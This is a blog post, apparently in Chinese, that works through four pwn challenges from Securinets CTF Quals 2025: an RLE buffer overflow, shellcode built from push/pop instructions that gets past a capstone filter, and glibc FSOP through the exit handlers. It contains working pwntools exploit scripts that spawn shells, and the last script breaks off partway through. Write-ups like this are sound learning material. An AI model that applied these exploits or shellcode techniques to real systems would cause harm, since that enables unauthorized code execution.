---
title: "Write-ups: Securinets CTF Quals 2025"
published: 2025-10-04
updated: 2026-01-23
description: "Write-ups for Securinets CTF Quals 2025 pwn aspect."
tags: ["Pwn", "Write-ups"]
category: "Write-ups"
draft: false
---

# zip++

## Information

- Category: Pwn
- Points: 500

## Description

> why isn't my compressor compressing ?!

## Write-up

问 AI，得知 `compress` 函数实现了一个 `RLE (Run-Length Encoding)` 压缩算法，压缩后格式为 `[字节 1][重复次数 1][字节 2][重复次数 2]...`，因此如果我们输入交替字符就会导致压缩率很差，溢出返回地址。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    ELF,
    args,
    context,
    flat,
    process,
    raw_input,
    remote,
)


FILE = "./main"
HOST, PORT = "pwn-14caf623.p1.securinets.tn", 9000

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def main():
    launch()

    payload = flat(
        b"AB" * 0xC6,
        b"\xa6" * 0x11,
    )
    raw_input("DEBUG")
    target.sendafter(b"data to compress :", payload)
    raw_input("DEBUG")
    target.sendline(b"exit")

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`Securinets{my_zip_doesnt_zip}`]

# push pull pops

## Information

- Category: Pwn
- Points: 500

## Description

> Shellcoding in the big 25 😱

## Write-up

有意思，第一次见 python 写的 pwn 题，这题只允许使用 `push`, `pop` 和 `int 3` 指令，但是测试发现非法指令会导致 capstone 直接返回 `None`，使得后面的指令不会被检查。所以我们只要把 shellcode 写到非法指令后面即可。

祭出指令表：[X86 Opcode and Instruction Reference Home](http://ref.x86asm.net/coder64.html)

但是有个问题是，从 mmap 分配的地址开始执行，必定会碰到我们的非法指令，然后就会 abort 。这里的解决方法也很简单，因为我们可以操作栈，那么，我们只要把 `rsp` 变成 mmap 出来的地址，然后用 `pop` 先提高栈地址，然后再 `push` 降低栈地址的同时，也将栈上原先的指令覆盖掉了。用什么覆盖？当然是 `nop` 啦～

最后说一下怎么调试，我们只要知道这个 python 脚本的 `pid` 就可以用 `gdb -p <pid>` 挂载，只要知道 mmap 返回的地址就可以调试 shellcode，还有，善用 `int 3` 也很重要。

```python ins={14-17}
def run(code: bytes):
    # Allocate executable memory using mmap

    mem = mmap.mmap(
        -1, len(code), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC
    )
    mem.write(code)

    # Create function pointer and execute
    func = ctypes.CFUNCTYPE(ctypes.c_void_p)(
        ctypes.addressof(ctypes.c_char.from_buffer(mem))
    )

    print(
        f"pid is: {os.getpid()}\nmem: {hex(ctypes.addressof(ctypes.c_char.from_buffer(mem)))}"
    )
    input("DEBUG")
    func()

    exit(1)
```

## Exploit

```python
#!/usr/bin/env python3

import argparse

from pwn import (
    ELF,
    asm,
    b64e,
    context,
    flat,
    process,
    raw_input,
    remote,
    shellcraft,
)

parser = argparse.ArgumentParser()
parser.add_argument("-L", "--local", action="store_true", help="Run locally")
parser.add_argument("-G", "--gdb", action="store_true", help="Enable GDB")
parser.add_argument("-P", "--port", type=int, default=1234, help="GDB port for QEMU")
parser.add_argument("-T", "--threads", type=int, default=None, help="Thread count")
args = parser.parse_args()


FILE = "./main.py"
HOST, PORT = "localhost", 1337

context(log_level="debug", terminal="kitty", arch="amd64")


def mangle(pos, ptr, shifted=1):
    if shifted:
        return pos ^ ptr
    return (pos >> 12) ^ ptr


def demangle(pos, ptr, shifted=1):
    if shifted:
        return mangle(pos, ptr)
    return mangle(pos, ptr, 0)


def launch(argv=None, envp=None):
    global target, thread

    if argv is None:
        argv = [FILE]

    if args.local and args.threads is not None:
        raise ValueError("Options -L and -T cannot be used together.")

    if args.local:
        if args.gdb and "qemu" in argv[0]:
            if "-g" not in argv:
                argv.insert(1, str(args.port))
                argv.insert(1, "-g")
        target = process(argv, env=envp)
    elif args.threads:
        if args.threads <= 0:
            raise ValueError("Thread count must be positive.")
        process(FILE)

        thread = [remote(HOST, PORT, ssl=False) for _ in range(args.threads)]
    else:
        target = remote(HOST, PORT, ssl=True)


def main():
    launch()

    payload = asm(
        """
        push r11
        pop rsp

        pop r15
        pop r15
        pop r15
        pop r15

        push r15
        push r15
        push r15
        """
    )

    payload += b"\x06" + asm(shellcraft.nop()) * 0xF
    payload += asm("add rsp, 0x100")
    payload += asm(shellcraft.sh())

    target.sendline(b64e(payload))

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`Securinets{push_pop_to_hero}`]

# push pull pops REVENGE

## Information

- Category: Pwn
- Points: 500

## Description

> you aint getting away with it , not on my watch .

## Write-up

这次题目加了输入和解码出来的指令之间的长度检测：

```python
if code_len != decoded:
    print("nice try")
    return False
```

那就把非法指令 ban 掉了，测试使用 semantically equivalent encodings 也没啥用，绕不开这个长度检测。

最后思路是自己构造一个 `syscall`，然后调用 `read`，这样就可以把 shellcode 读进去，不被过滤。

官方的 solution 也是构造 `read`，不过官方的 wp 里面，`syscall` 不是自己造的，而是利用内存中现成的，所以只要操作 `push`，`pop` 到对应内存就能拿到了。而我这里用的方法就复杂了点，<s>让我们假设内存空间非常贫瘠，寸草不生，根本没有残留的 `syscall`</s>，那能不能凭空造一个出来？

由于这题也是 mmap 了一块 `rwx` 的内存，所以只要我们的内存中有 `syscall` 的机器码，它就能执行到，我们只要在执行前提前布置好调用 `read` 用到的寄存器即可。

:::caution
由于这道题的特殊性，远程内存环境和本地肯定是大不相同的，因为我们不管是自己造 `syscall` 还是找现成的，都对内存环境布局有着极其严格的要求，所以这题必须在 docker 里跑，本地远程调试。
:::

首先解决一下调试的问题，我们将容器启动后自动执行的指令改一下，挂上 `gdbserver`，开放 `1234` 端口用于调试：

```dockerfile del={1} ins={2}
CMD socat TCP-LISTEN:5000,reuseaddr,fork EXEC:/app/run
CMD ["gdbserver", ":1234", "socat", "TCP-LISTEN:5000,reuseaddr,fork", "EXEC:/app/run"]
```

然后 `docker-compose.yml` 也需要改，开放一下调试端口：

```yaml ins={8}
version: "3.8"

services:
  vertical_tables:
    build: .
    ports:
      - "1304:5000"
      - "1234:1234"
    deploy:
      resources:
        limits:
          cpus: "1"
          memory: 1000M
    read_only: true
    cap_drop:
      - all
    privileged: true
```

现在只要运行 `docker compose up -d` 就把容器跑起来了，然后 exp 直接连接 `1304` 端口与题目交互。

既然要自己造 `syscall`，那肯定得先搞清楚这玩意儿的机器码是多少，可以这样：

```shellsession
λ ~/ pwn asm -c amd64 "syscall"
0f05
```

那我们只要想办法弄到 `\x0f` 和 `\x05` 就成功了一半。观察内存，发现有一个现成的 `\x05`：

<center>
  <img src="https://cdn.cubeyond.net/gh/CuB3y0nd/picx-images-hosting@master/.2rvmves3vy.avif" alt="" />
</center>

虽然也有现成的 `\x0f`，但是它行吗？我们可以做一个简单的测试，直接找一片空内存改，然后看看解析出来是什么指令：

<center>
  <img src="https://cdn.cubeyond.net/gh/CuB3y0nd/picx-images-hosting@master/.32igoksjy3.avif" alt="" />
</center>

并不是我们期望的 `syscall`，很简单，因为 `amd64` 是小端序的，所以我们不能写 `\x0f`，而是应该写 `0x0f00000000000000`。

<center>
  <img src="https://cdn.cubeyond.net/gh/CuB3y0nd/picx-images-hosting@master/.99tuor2zt2.avif" alt="" />
</center>

至于为啥必须这样？因为我的想法是找一个带 `\x0f` 的 `push` or `pop` 指令放在最后，然后用一堆单字节的 `push` or `pop` 将 `\x0f` 卡到第八个字节的位置，最后将事先获取到的 `\x05` 通过 `push` 覆盖掉前面被挤出来的字节，就有了一个 `syscall`。

<center>
  <img src="https://cdn.cubeyond.net/gh/CuB3y0nd/picx-images-hosting@master/.5triwpchiq.avif" alt="" />
</center>

但是我们怎么保证，这样弄到了 `syscall`，它就一定会执行呢？因为我们不可能跳回到前面 `syscall` 的地方去执行。这就得益于来自上一题的灵感了，因为如果是非法指令的话，CPU 会卡在那里不往下走，但是一旦我们将非法指令替换成了合法指令，它就又能继续往下跑了～

这里选的指令是 `pop fs`，实测 `push fs` 不行。

<center>
  <img src="https://cdn.cubeyond.net/gh/CuB3y0nd/picx-images-hosting@master/.7lkhrm6jvb.avif" alt="" />
</center>

所以我的 exp 就不难理解了，一开始的 `0x4d` 个 `pop r15` 是为了弄到 `\x05`，保存在 `r15` 里：

<center>
  <img src="https://cdn.cubeyond.net/gh/CuB3y0nd/picx-images-hosting@master/.6f16izwiop.avif" alt="" />
</center>

然后设置了调用 `read` 用到的几个寄存器，`rax` 不用管，本来就是 `0`，用它设置一下 `rdi`，然后利用内存中的残留值设置 `rdx`，`rsi` 可以最后栈迁移到 shellcode 的时候设置。

最后就是栈迁移回 shellcode，通过操作 `push`，`pop` 定位到要覆盖的指令处，最后将 `\x05` 填上去即可。

## Exploit

```python
#!/usr/bin/env python3

import argparse

from pwn import (
    ELF,
    asm,
    b64e,
    context,
    flat,
    process,
    raw_input,
    remote,
    shellcraft,
    sleep,
)

parser = argparse.ArgumentParser()
parser.add_argument("-L", "--local", action="store_true", help="Run locally")
parser.add_argument("-G", "--gdb", action="store_true", help="Enable GDB")
parser.add_argument("-P", "--port", type=int, default=1234, help="GDB port for QEMU")
parser.add_argument("-T", "--threads", type=int, default=None, help="Thread count")
args = parser.parse_args()


FILE = "./main.py"
HOST, PORT = "localhost", 1304

context(log_level="debug", terminal="kitty", arch="amd64")


def mangle(pos, ptr, shifted=1):
    if shifted:
        return pos ^ ptr
    return (pos >> 12) ^ ptr


def demangle(pos, ptr, shifted=1):
    if shifted:
        return mangle(pos, ptr)
    return mangle(pos, ptr, 0)


def launch(argv=None, envp=None):
    global target, thread

    if argv is None:
        argv = [FILE]

    if args.local and args.threads is not None:
        raise ValueError("Options -L and -T cannot be used together.")

    if args.local:
        if args.gdb and "qemu" in argv[0]:
            if "-g" not in argv:
                argv.insert(1, str(args.port))
                argv.insert(1, "-g")
        target = process(argv, env=envp)
    elif args.threads:
        if args.threads <= 0:
            raise ValueError("Thread count must be positive.")
        process(FILE)

        thread = [remote(HOST, PORT, ssl=False) for _ in range(args.threads)]
    else:
        target = remote(HOST, PORT, ssl=False)


def main():
    launch()

    payload = asm("pop r15") * 0x4D
    payload += asm(
        """
        pop rsp
        pop r15

        push rax
        pop rdi
        """
    )
    payload += asm("pop rbx") * 0x14
    payload += asm("pop rdx")
    payload += asm("push rbx") * 0x1B
    payload += asm(
        """
        push r11
        pop rsi

        push r11
        pop rsp
        """
    )
    payload += asm("pop rbx") * 0x20
    payload += asm("push r15")
    payload += b"\x0f\xa1"

    target.sendline(b64e(payload))
    target.sendline()

    sc = asm(shellcraft.nop() * 0x150 + shellcraft.sh())
    sleep(1)
    target.sendline(sc)

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

复现。

# V-tables

## Information

- Category: Pwn
- Points: 500

## Description

> idk

## Write-up

这题也是复现，当时我还没学 FSOP，所以就直接跳过了……

看了下[官方 wp](https://buddurid.me/2025/10/04/securinets-quals-2025)，发现这种题其实还是有迹可循的。

先看一下 IDA，逻辑特别简单：

```c
void __fastcall setup(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0);
  setbuf(stdout, 0);
}

__int64 vuln()
{
  printf("stdout : %p\n", stdout);
  read(0, stdout, 0xD8u);
  return 0;
}

int __fastcall main(int argc, const char **argv, const char **envp)
{
  setup(argc, argv, envp);
  vuln();
  return 0;
}
```

直接送了 libc 地址，然后可以修改 `stdout` 结构体，但是由于最大只能读 `0xD8` 字节，也就是正好覆盖整个 `_IO_FILE` 结构体，除了 `vtable` 字段写不到外。那常规的 House of Apple 就打不了了。

那怎么办？我们没有任何可以利用的地方了吗？未必。

先看一下最终的调用链：

<center>
  <img src="https://cdn.cubeyond.net/gh/CuB3y0nd/picx-images-hosting@master/.1zirgqfcjo.avif" alt="" />
</center>

熟悉程序生命周期的话，应该知道 `main` 函数返回其实会自动调用 `exit`，由于我们也干不了别的事了，那估计多半就是要去分析 `exit` 的流程找利用点了（有种被引导的感觉）。

[exit](https://sourcegraph.com/github.com/bminor/glibc@release/2.41/master/-/blob/stdlib/exit.c?L146:1-146:5) 的实现如下：

```c {4}
void
exit (int status)
{
  __run_exit_handlers (status, &__exit_funcs, true, true);
}
libc_hidden_def (exit)
```

直接跟进到 [\_\_run_exit_handlers](https://sourcegraph.com/github.com/bminor/glibc@release/2.41/master/-/blob/stdlib/exit.c?L43:1-43:20)：

```c collapse={1-98} {102}
/* Call all functions registered with `atexit' and `on_exit',
   in the reverse of the order in which they were registered
   perform stdio cleanup, and terminate program execution with STATUS.  */
void
attribute_hidden
__run_exit_handlers (int status, struct exit_function_list **listp,
       bool run_list_atexit, bool run_dtors)
{
  /* The exit should never return, so there is no need to unlock it.  */
  __libc_lock_lock_recursive (__exit_lock);

  /* First, call the TLS destructors.  */
  if (run_dtors)
    call_function_static_weak (__call_tls_dtors);

  __libc_lock_lock (__exit_funcs_lock);

  /* We do it this way to handle recursive calls to exit () made by
     the functions registered with `atexit' and `on_exit'. We call
     everyone on the list and use the status value in the last
     exit (). */
  while (true)
    {
      struct exit_function_list *cur;

    restart:
      cur = *listp;

      if (cur == NULL)
 {
   /* Exit processing complete.  We will not allow any more
      atexit/on_exit registrations.  */
   __exit_funcs_done = true;
   break;
 }

      while (cur->idx > 0)
 {
   struct exit_function *const f = &cur->fns[--cur->idx];
   const uint64_t new_exitfn_called = __new_exitfn_called;

   switch (f->flavor)
     {
       void (*atfct) (void);
       void (*onfct) (int status, void *arg);
       void (*cxafct) (void *arg, int status);
       void *arg;

     case ef_free:
     case ef_us:
       break;
     case ef_on:
       onfct = f->func.on.fn;
       arg = f->func.on.arg;
       PTR_DEMANGLE (onfct);

       /* Unlock the list while we call a foreign function.  */
       __libc_lock_unlock (__exit_funcs_lock);
       onfct (status, arg);
       __libc_lock_lock (__exit_funcs_lock);
       break;
     case ef_at:
       atfct = f->func.at;
       PTR_DEMANGLE (atfct);

       /* Unlock the list while we call a foreign function.  */
       __libc_lock_unlock (__exit_funcs_lock);
       atfct ();
       __libc_lock_lock (__exit_funcs_lock);
       break;
     case ef_cxa:
       /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
   we must mark this function as ef_free.  */
       f->flavor = ef_free;
       cxafct = f->func.cxa.fn;
       arg = f->func.cxa.arg;
       PTR_DEMANGLE (cxafct);

       /* Unlock the list while we call a foreign function.  */
       __libc_lock_unlock (__exit_funcs_lock);
       cxafct (arg, status);
       __libc_lock_lock (__exit_funcs_lock);
       break;
     }

   if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))
     /* The last exit function, or another thread, has registered
        more exit functions.  Start the loop over.  */
     goto restart;
 }

      *listp = cur->next;
      if (*listp != NULL)
 /* Don't free the last element in the chain, this is the statically
    allocate element.  */
 free (cur);
    }

  __libc_lock_unlock (__exit_funcs_lock);

  if (run_list_atexit)
    call_function_static_weak (_IO_cleanup);

  _exit (status);
}
```

没有注意到什么好玩的东西，除了 [\_IO_cleanup](https://sourcegraph.com/github.com/bminor/glibc@release/2.41/master/-/blob/libio/genops.c?L873:1-873:12) 外，因为它涉及到 `IO` 操作，可以跟进去看看：

```c {15} ins={"1. Make sure set fp->_flags = 0x8 to bypass _IO_OVERFLOW called in": 4} ins={"   this function which modifies _IO_2_1_stdout_ fields": 5-6}
int
_IO_cleanup (void)
{


  int result = _IO_flush_all ();

  /* We currently don't have a reliable mechanism for making sure that
     C++ static destructors are executed in the correct order.
     So it is possible that other static destructors might want to
     write to cout - and they're supposed to be able to do so.

     The following will make the standard streambufs be unbuffered,
     which forces any output from late destructors to be written out. */
  _IO_unbuffer_all ();

  return result;
}
```

此时，就涉及到了两个大函数需要分析，一个是 [\_IO_flush_all](https://sourcegraph.com/github.com/bminor/glibc@release/2.41/master/-/blob/libio/genops.c?L711:1-711:14) 一个是 [\_IO_unbuffer_all](https://sourcegraph.com/github.com/bminor/glibc@fb4db64a04ad6c96cd1fbb7e02eb59323b1f2ac2/-/blob/libio/genops.c?L797:1-797:17)。

我在分析 `_IO_flush_all` 的时候没发现什么特别有意思的地方，但是它可以调用 `_IO_OVERFLOW`，然后这个函数里可以调用 `_IO_do_write`，于是想到一种方法：利用 `main` 函数返回自动调用 `_IO_cleanup->_IO_flush_all` flush `_IO_2_1_stdout_` 结构体的时候，假设我们事先将其 `_IO_write_base` 改成 `_IO_2_1_stdin_` 结构体的地址，由于 size 是通过 `f->_IO_write_ptr - f->_IO_write_base` 计算的，我也可以将其改大，这样让它触发 `_IO_do_write`，向 `_IO_2_1_stdin_` 写任意大小数据，覆盖它的 `vtable`, （由于 `_IO_list_all` 链表的顺序是 `stderr->stdout->stdin`）这样，我 flush 完 `stdout` 再去 flush `stdin` 的时候是不是会调用我自定义的 `vtable` 去执行任意操作？

虽然想法很美好，但是我发现，`_IO_do_write (f, f->_IO_write_base, f->_IO_write_ptr - f->_IO_write_base)->_IO_SYSWRITE (fp, data, to_do)->__write (f->_fileno, data, to_do)`，也就是说，它只能向当前被 flush 的结构体的 `_fileno` 写数据……那这条路就行不通了。

其实还有一个想法，就是我将 `_chain` 修改为当前结构体 `+0x8` 的地址，这样就伪造了下一个被刷新的结构体，因为 `+0x8`，所以我们也就控制了 `vtable`，但是我们没有 `_flags` 的控制权，不知道行不行，只是一个潜在可行的想法，以后可以试试能不能打。

继续看下面的 [\_IO_unbuffer_all](https://sourcegraph.com/github.com/bminor/glibc@fb4db64a04ad6c96cd1fbb7e02eb59323b1f2ac2/-/blob/libio/genops.c?L797:1-797:17) 了，看看能不能有什么发现：

```c {43} ins={"2. We just need bypass fp->_mode != 0 here": 29-32} collapse={1-25, 36-39, 47-62}
static void
_IO_unbuffer_all (void)
{
  FILE *fp;

#ifdef _IO_MTSAFE_IO
  _IO_cleanup_region_start_noarg (flush_cleanup);
  _IO_lock_lock (list_all_lock);
#endif

  for (fp = (FILE *) _IO_list_all; fp; fp = fp->_chain)
    {
      int legacy = 0;

      run_fp = fp;
      _IO_flockfile (fp);

#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)
      if (__glibc_unlikely (_IO_vtable_offset (fp) != 0))
 legacy = 1;
#endif

      /* Free up the backup area if it was ever allocated.  */
      if (_IO_have_backup (fp))
 _IO_free_backup_area (fp);
      if (!legacy && fp->_mode > 0 && _IO_have_wbackup (fp))
 _IO_free_wbackup_area (fp);


      if (! (fp->_flags & _IO_UNBUFFERED)
   /* Iff stream is un-orientated, it wasn't used. */
   && (legacy || fp->_mode != 0))
 {
   if (! legacy && ! dealloc_buffers && !(fp->_flags & _IO_USER_BUF))
     {
       fp->_flags |= _IO_USER_BUF;

       fp->_freeres_list = freeres_list;
       freeres_list = fp;
       fp->_freeres_buf = fp->_IO_buf_base;
     }

   _IO_SETBUF (fp, NULL, 0);

   if (! legacy && fp->_mode > 0)
     _IO_wsetb (fp, NULL, NULL, 0);
 }

      /* Make sure that never again the wide char functions can be
  used.  */
      if (! legacy)
 fp->_mode = -1;

      _IO_funlockfile (fp);
      run_fp = NULL;
    }

#ifdef _IO_MTSAFE_IO
  _IO_lock_unlock (list_all_lock);
  _IO_cleanup_region_end (0);
#endif
}
```

注意到沿着 [\_IO_SETBUF](https://sourcegraph.com/github.com/bminor/glibc@fb4db64a04ad6c96cd1fbb7e02eb59323b1f2ac2/-/blob/libio/genops.c?L477:1-477:19) 往下走的话会有一个好玩的东西：

```c {4}
FILE *
_IO_default_setbuf (FILE *fp, char *p, ssize_t len)
{
    if (_IO_SYNC (fp) == EOF)
 return NULL;
    if (p == NULL || len == 0)
      {
 fp->_flags |= _IO_UNBUFFERED;
 _IO_setb (fp, fp->_shortbuf, fp->_shortbuf+1, 0);
      }
    else
      {
 fp->_flags &= ~_IO_UNBUFFERED;
 _IO_setb (fp, p, p+len, 0);
      }
    fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end = NULL;
    fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_read_end = NULL;
    return fp;
}
```

藏在 [\_IO_SYNC](https://sourcegraph.com/github.com/bminor/glibc@fb4db64a04ad6c96cd1fbb7e02eb59323b1f2ac2/-/blob/libio/fileops.c?L793:1-793:18) 里面：

```c {10} ins={"3. Make sure fp->_IO_write_ptr > fp->_IO_write_base": 7-9}
int
_IO_new_file_sync (FILE *fp)
{
  ssize_t delta;
  int retval = 0;


  /*    char* ptr = cur_ptr(); */
  if (fp->_IO_write_ptr > fp->_IO_write_base)
    if (_IO_do_flush(fp)) return EOF;
  delta = fp->_IO_read_ptr - fp->_IO_read_end;
  if (delta != 0)
    {
      off64_t new_pos = _IO_SYSSEEK (fp, delta, 1);
      if (new_pos != (off64_t) EOF)
 fp->_IO_read_end = fp->_IO_read_ptr;
      else if (errno == ESPIPE)
 ; /* Ignore error from unseekable devices. */
      else
 retval = EOF;
    }
  if (retval != EOF)
    fp->_offset = _IO_pos_BAD;
  /* FIXME: Cleanup - can this be shared? */
  /*    setg(base(), ptr, ptr); */
  return retval;
}
libc_hidden_ver (_IO_new_file_sync, _IO_file_sync)
```

然后走 [\_IO_do_flush](https://sourcegraph.com/github.com/bminor/glibc@fb4db64a04ad6c96cd1fbb7e02eb59323b1f2ac2/-/blob/libio/libioP.h?L562:9-562:21)，由于之前已经将 `mode` 改为了 `1`，所以这里会执行 [\_IO_wdo_write](https://sourcegraph.com/github.com/bminor/glibc@fb4db64a04ad6c96cd1fbb7e02eb59323b1f2ac2/-/blob/libio/wfileops.c?L38:1-38:14)，而这，也是我们所期望的。

```c {5-7}
#define _IO_do_flush(_f)                                        \
  ((_f)->_mode <= 0                                             \
   ? _IO_do_write(_f, (_f)->_IO_write_base,                     \
    (_f)->_IO_write_ptr-(_f)->_IO_write_base)                   \
   : _IO_wdo_write(_f, (_f)->_wide_data->_IO_write_base,        \
     ((_f)->_wide_data->_IO_write_ptr                           \
      - (_f)->_wide_data->_IO_write_base)))
```

走到 [\_IO_wdo_write](https://sourcegraph.com/github.com/bminor/glibc@fb4db64a04ad6c96cd1fbb7e02eb59323b1f2ac2/-/blob/libio/wfileops.c?L38:1-38:14) 就差不多快结束了。

```c del={42-46} ins={"4. We need enter this conditional statement, which requires": 8} ins={"   ((_f)->_wide_data->_IO_write_ptr - (_f)->_wide_data->_IO_write_base)) > 0": 9-10} collapse={14-38, 50-76}
/* Convert TO_DO wide character from DATA to FP.
   Then mark FP as having empty buffers. */
int
_IO_wdo_write (FILE *fp, const wchar_t *data, size_t to_do)
{
  struct _IO_codecvt *cc = fp->_codecvt;



  if (to_do > 0)
    {
      if (fp->_IO_write_end == fp->_IO_write_ptr
   && fp->_IO_write_end != fp->_IO_write_base)
 {
   if (_IO_new_do_write (fp, fp->_IO_write_base,
    fp->_IO_write_ptr - fp->_IO_write_base) == EOF)
     return WEOF;
 }

      do
 {
   enum __codecvt_result result;
   const wchar_t *new_data;
   char mb_buf[MB_LEN_MAX];
   char *write_base, *write_ptr, *buf_end;

   if (fp->_IO_buf_end - fp->_IO_write_ptr < sizeof (mb_buf))
     {
       /* Make sure we have room for at least one multibyte
   character.  */
       write_ptr = write_base = mb_buf;
       buf_end = mb_buf + sizeof (mb_buf);
     }
   else
     {
       write_ptr = fp->_IO_write_ptr;
       write_base = fp->_IO_write_base;
       buf_end = fp->_IO_buf_end;
     }

   /* Now convert from the internal format into the external buffer.  */
   result = __libio_codecvt_out (cc, &fp->_wide_data->_IO_state,
     data, data + to_do, &new_data,
     write_ptr,
     buf_end,
     &write_ptr);

   /* Write out what we produced so far.  */
   if (_IO_new_do_write (fp, write_base, write_ptr - write_base) == EOF)
     /* Something went wrong.  */
     return WEOF;

   to_do -= new_data - data;

   /* Next see whether we had problems during the conversion.  If yes,
      we cannot go on.  */
   if (result != __codecvt_ok
       && (result != __codecvt_partial || new_data - data == 0))
     break;

   data = new_data;
 }
      while (to_do > 0);
    }

  _IO_wsetg (fp, fp->_wide_data->_IO_buf_base, fp->_wide_data->_IO_buf_base,
      fp->_wide_data->_IO_buf_base);
  fp->_wide_data->_IO_write_base = fp->_wide_data->_IO_write_ptr
    = fp->_wide_data->_IO_buf_base;
  fp->_wide_data->_IO_write_end = ((fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
       ? fp->_wide_data->_IO_buf_base
       : fp->_wide_data->_IO_buf_end);

  return to_do == 0 ? 0 : WEOF;
}
libc_hidden_def (_IO_wdo_write)
```

我们发现下面这个 [DL_CALL_FCT](https://sourcegraph.com/github.com/MisterTea/HyperNEAT@516fef725621991ee709eb9b4afe40e0ce82640d/-/blob/NE/HyperNEAT/Hypercube_NEAT/include/Experiments/HCUBE_cliche.h?L59:9-59:20) 其实是一个函数调用，而这个函数指针和参数我们都可以通过 overlapping 结构体来伪造。

虽然理想的情况是，令 `gs` 为 `/bin/sh` 指针，另 `__fct` 为 `system`，但是实际调试发现，但凡我们控制其中任意一个，另一个就无法控制了（控制 `/bin/sh` 的话就不能绕过 `PTR_DEMANGLE (fct)`，绕过 `PTR_DEMANGLE (fct)` 的话就不能控制 `/bin/sh`，而这一切都是因为它汇编层使用的寄存器是 `r15`，这个可以自己去调试，我不想再都截一遍图了，老实说有点恶心……）。由于任意代码执行的重要性更大，所以我选择控制 `__fct`，`/bin/sh` 则通过 `add rdi, 0x10; jmp rcx` 这个 gadget 控制。

```c del={1, 26-29} del={"5. Make sure codecvt->__cd_out.step = b'/bin/sh\x00'": 11-12} del={"6. Make sure gs->__fct = system": 21-22} collapse={33-52}
#define DL_CALL_FCT(fctp, args) (fctp) args

enum __codecvt_result
__libio_codecvt_out (struct _IO_codecvt *codecvt, __mbstate_t *statep,
       const wchar_t *from_start, const wchar_t *from_end,
       const wchar_t **from_stop, char *to_start, char *to_end,
       char **to_stop)
{
  enum __codecvt_result result;


  struct __gconv_step *gs = codecvt->__cd_out.step;
  int status;
  size_t dummy;
  const unsigned char *from_start_copy = (unsigned char *) from_start;

  codecvt->__cd_out.step_data.__outbuf = (unsigned char *) to_start;
  codecvt->__cd_out.step_data.__outbufend = (unsigned char *) to_end;
  codecvt->__cd_out.step_data.__statep = statep;


  __gconv_fct fct = gs->__fct;
  if (gs->__shlib_handle != NULL)
    PTR_DEMANGLE (fct);

  status = DL_CALL_FCT (fct,
   (gs, &codecvt->__cd_out.step_data, &from_start_copy,
    (const unsigned char *) from_end, NULL,
    &dummy, 0, 0));

  *from_stop = (wchar_t *) from_start_copy;
  *to_stop = (char *) codecvt->__cd_out.step_data.__outbuf;

  switch (status)
    {
    case __GCONV_OK:
    case __GCONV_EMPTY_INPUT:
      result = __codecvt_ok;
      break;

    case __GCONV_FULL_OUTPUT:
    case __GCONV_INCOMPLETE_INPUT:
      result = __codecvt_partial;
      break;

    default:
      result = __codecvt_error;
      break;
    }

  return result;
}
```

那现在问题就变成了，如何控制 `rcx` 指向 `system`？调试发现，`rcx` 的计算过程是可逆的，并且可以控制为任意值。具体流程，需要从 `jmp rcx` 开始反向溯源，看它是怎么得来的。最终发现，源头来自执行 [\_IO_wdo_write](https://sourcegraph.com/github.com/bminor/glibc@fb4db64a04ad6c96cd1fbb7e02eb59323b1f2ac2/-/blob/libio/libioP.h?L566) 时的 `lea rcx, [r12 + r13*4]`，`rcx` 从这里被设置后直到执行 `__fct` 都没有被修改过。

<center>
  <img src="https://cdn.cubeyond.net/gh/CuB3y0nd/picx-images-hosting@master/.7axo1vqy3o.avif" alt="" />
</center>

观察这条指令，我们不难想到，控制 `rcx` 要么就是令 `r12 = system, r13 = 0`，要么就是令 `r12 = 0, r13 = system // 4`。继续溯源 `r12` 发现，它是 `rsi`，即 `(_f)->_wide_data->_IO_write_base`。由于后面 overlapping 结构体的时候我用到了这个字段，所以我选择了令 `r13 = system // 4`，而 `r13` 也是可控的，为 `rdx`，即 `(_f)->_wide_data->_IO_write_ptr - (_f)->_wide_data->_IO_write_base`。

但是直接这样设置发现，并没有得到 `system`，于是我们继续往上溯源，看一下 `rsi` 和 `rdx` 到底是怎么传入的，发现，`rdx` 其实是被动过手脚的……

<center>
  <img src="https://cdn.cubeyond.net/gh/CuB3y0nd/picx-images-hosting@master/.32igs2x3uo.avif" alt="" />
</center>

但很显然这是一个可逆计算，YAAAY～

## Exploit

```python
#!/usr/bin/env python3

import argparse

from pwn import (
    ELF,
    ROP,
    FileStructure,
    context,
    flat,
    process,
    raw_input,
    remote,
)

parser = argparse.ArgumentParser()
parser.add_argument("-L", "--local", action="store_true", help="Run locally")
parser.add_argument("-G", "--gdb", action="store_true", help="Enable GDB")
parser.add_argument("-P", "--port", type=int, default=1234, help="GDB port for QEMU")
parser.add_argument("-T", "--threads", type=int, default=None, help="Thread count")
args = parser.parse_args()


FILE = "./main_patched"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary
libc = elf.libc
rop = ROP(libc)


def mangle(pos, ptr, shifted=1):
    if shifted:
        return pos ^ ptr
    return (pos >> 12) ^ ptr


def demangle(pos, ptr, shifted=1):
    if shifted:
        return mangle(pos, ptr)
    return mangle(pos, ptr, 0)


def launch(argv=None, envp=None):
    global target, thread

    if argv is None:
        argv = [FILE]

    if args.local and args.threads is not None:
        raise ValueError("Options -L and -T cannot be used together.")

    if args.local:
        if args.gdb and "qemu" in argv[0]:
            if "-g" not in argv:
                argv.insert(1, str(args.port))
                argv.insert(1, "-g")
        target = process(argv, env=envp)
    elif args.threads:
        if args.threads <= 0:
            raise ValueError("Thread count must be positive.")
        process(FILE)

        thread = [remote(HOST, PORT, ssl=False) for _ in range(args.threads)]
    else:
        target = remote(HOST, PORT, ssl=True)


def main():
    launch()

    target.recvuntil(b"stdout : ")
    stdout = int(target.recvline(), 16)
    libc.address = stdout - libc.sym["_IO_2_1_stdout_"]
    add_rdi_0x10_jmp_rcx = libc.address + 0x000000000017D690
